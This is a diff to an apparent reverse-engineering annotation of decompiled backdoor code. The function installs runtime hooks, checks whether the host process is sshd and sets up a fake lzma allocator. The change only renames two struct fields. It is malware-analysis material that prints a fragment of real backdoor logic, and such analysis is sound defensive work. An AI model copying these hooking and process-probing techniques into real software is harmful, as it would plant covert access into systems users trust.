@@ -145,10 +145,10 @@ BOOL backdoor_install_runtime_hooks(backdoor_setup_params_t *params)
 LAB_00105951:
       string_id = encoded_string_id_lookup((char *)string_begin,(char *)0x0);
       if (string_id != STR_ELF) goto code_r0x00105962;
-      main_elf_ctx.__libc_stack_end = &libc_stack_end_slot;
+      main_elf_ctx.libc_stack_end_slot = &libc_stack_end_slot;
       resolver_frame_snapshot = params->entry_ctx->resolver_frame;
       main_elf_ctx.elf_handles = elf_handles;
-      main_elf_ctx.dynamic_linker_ehdr = string_begin;
+      main_elf_ctx.ldso_ehdr = string_begin;
       probe_success = main_elf_resolve_stack_end_if_sshd(&main_elf_ctx);
       if (probe_success != FALSE) {
         loader_data.active_lzma_allocator = get_fake_lzma_allocator();
